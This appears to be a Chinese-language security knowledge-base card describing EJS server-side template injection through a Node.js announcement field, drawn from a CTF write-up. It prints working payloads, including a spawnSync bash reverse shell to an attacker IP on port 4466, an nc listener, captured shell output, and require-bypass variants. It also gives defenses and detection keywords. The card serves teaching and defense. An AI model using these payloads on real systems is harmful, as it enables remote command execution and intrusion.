---
id: web-nodejs-ssti-ejs-announcement-content-rce
title: EJS 模板 <%= %> 注入：公告板内容字段被服务端渲染导致 Node.js 任意命令执行
type: scenario
domain: web
path: web/nodejs/ssti
technique: ejs-content-field-ssti-rce
aliases:
- EJS SSTI
- EJS 模板注入 RCE
- <%= 7*7 %>
- 公告板 SSTI
- Node 模板注入
- require child_process spawnSync
tags:
- nodejs
- ejs
- ssti
- template-injection
- rce
- express
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V165
  verified_at: '2026-11-06T13:30:35+08:00'
  notes: 已对照原文核对：公告内容字段 <%=7*7%> 渲染为 49（图05）、require('node:child_process').spawnSync 反弹 4466 获 agent shell 与原文一致；原文未给 EJS/Express 版本与渲染源码，卡内已注明；未在本机执行 PoC
---

## 一句话结论

当 Node.js 应用把用户提交的公告内容当作 EJS 模板源码交给服务端渲染时，`<%= 7*7 %>` 会返回 `49`，说明表达式在服务端求值；把表达式换成 `require('node:child_process').spawnSync(...)` 即可执行任意命令并反弹 Shell。

## 原理

- **模板源码与用户数据混用**：EJS 的 `<%= expr %>` 语义是“求值 `expr` 并把结果转义后输出”。正常用法是把模板文件固定、用户数据放在 `locals` 变量里；如果应用把用户输入直接传给 `ejs.render(userContent)` 或把内容拼接进模板再编译，用户输入就成了模板源码，其中的 JS 表达式会被执行。
- **探测与确认**：提交 `<%= 7*7 %>`，页面渲染出 `49` 而不是字面量，证明服务端在解析 EJS 分隔符并求值表达式。
- **RCE 表达式**：`<%= require('node:child_process').spawnSync('bash',['-c','bash -i >& /dev/tcp/ATTACKER/4466 0>&1'],{encoding:'utf8'}).stdout %>` 在模板函数作用域内加载 `child_process`，同步启动 bash 反连；`stdout` 作为模板输出返回。
- **作用域差异**：EJS 编译出的函数默认不保证注入 `require`；本文目标中 `require` 可直接使用（应用可能通过 `locals`、`global` 或编译选项提供）。若目标中不可用，可尝试 `global.process.mainModule.require('child_process')`、`process.mainModule.require(...)` 或 `this.constructor.constructor('return process')()` 等等价路径。
- **危害放大**：渲染进程通常以 Web 服务用户运行；若该用户属于 docker 组或容器内存在挂载/凭据，可继续提权或横向（本文后续即从该 Shell 进一步利用）。

## 触发条件

- Node.js 应用使用 EJS，且把用户可控内容作为模板字符串渲染（而非仅作为 `locals` 数据）。
- 输入点可为公告/评论/邮件模板/报表等会被服务端渲染的字段；本文为内部公告板的“内容”字段。
- 服务端未对 `<%`、`%>` 等模板分隔符做转义或过滤，也未使用沙箱/受限模板引擎。
- 渲染进程可加载 `child_process`（Node 默认可用），且能出网或至少能执行本地命令。

## 利用步骤

1. 找到会把输入回显到页面并可能被模板引擎处理的内容字段（公告、评论、签名、模板配置等）。
2. 提交 `<%= 7*7 %>`；若页面显示 `49`，确认 EJS 表达式求值。
3. 攻击机监听：`nc -lvnp 4466`。
4. 提交 RCE payload：
   `<%= require('node:child_process').spawnSync('bash',['-c','bash -i >& /dev/tcp/<ATTACKER_IP>/4466 0>&1'],{encoding:'utf8'}).stdout %>`
5. 收到回连后确认用户与容器环境：`id`、`hostname`、`ls -l /.dockerenv`。
6. 若 `require` 不可用，改用 `global.process.mainModule.require` 或 `process.mainModule.require` 变体重试。

## PoC

```text
# 1) 探测：页面渲染出 49
<%= 7*7 %>
```

```bash
# 2) 攻击机监听
nc -lvnp 4466
```

```text
# 3) 命令执行 + 反弹 Shell
<%= require('node:child_process').spawnSync('bash',['-c','bash -i >& /dev/tcp/192.168.56.130/4466 0>&1'],{encoding:'utf8'}).stdout %>
```

```text
# 4) 回连结果（节选）
connect to [192.168.56.130] from (UNKNOWN) [192.168.56.142] 46054
agent@despromptado:/opt/prompting$ id
uid=1000(agent) gid=990(docker) grupos=990(docker),...
```

原文在 CTF 靶机中完整复现；未给出 EJS/Express 版本与模板渲染源码。本卡未执行 PoC。

## 变体与关联

- **变体：`<%- %>` 与 `<% %>`**：`<%- %>` 不转义输出，`<% %>` 只执行不输出；命令执行不依赖输出时可用 `<% ... %>`，需要回显命令结果时用 `<%= ... %>`/`<%- ... %>`。
- **变体：`require` 不可用**：尝试 `global.process.mainModule.require('child_process')`、`process.mainModule.require('child_process')`、`this.constructor.constructor('return process')()` 等取回 Node 全局对象；不同 EJS 编译方式作用域不同。
- **变体：其他模板引擎**：Pug、Handlebars、Nunjucks、doT 等同样可能因“用户输入当模板”导致 SSTI；先做引擎识别，再选对应语法。
- **关联**：[[web-nodejs-ssti-handlebars-ast-injection]]（Node 模板引擎代码执行）、[[web-generic-ssti-engine-identification-decision-tree-errors]]（模板引擎识别）、[[web-generic-ssti-error-message-exfiltration]]（无回显时用报错外带命令输出）。
- **边界**：应用把用户内容作为 `locals` 数据而不是模板源码、对 `<%` 转义、使用沙箱模板或禁用 `child_process` 时，利用失败；渲染进程权限与网络策略决定后续影响。

## 检测与防御

- **根本修复**：不要把用户输入作为模板源码；模板文件固定，用户内容只通过 `locals` 变量传入并按普通文本转义。禁止 `ejs.render(userInput)`、`ejs.compile(userInput)` 等动态模板用法。
- **输入/输出处理**：对包含 `<%`、`%>`、`${` 等模板分隔符的输入做转义或拒绝；输出按上下文编码，避免二次渲染。
- **运行隔离**：模板渲染进程以最小权限运行，禁用不需要的 `child_process`/网络能力；使用沙箱化模板引擎或独立渲染服务。
- **检测**：监控公告/评论等字段中出现 `<%=`、`<%-`、`<%`、`require(`、`child_process`、`spawnSync`、`/dev/tcp/` 等特征；关注渲染进程派生的 `bash`/`nc` 子进程与异常外联。
- **响应**：发现可疑模板内容立即下线/删除，隔离渲染服务，检查同用户权限下的其他数据与容器逃逸迹象，轮换可能泄露的凭据。
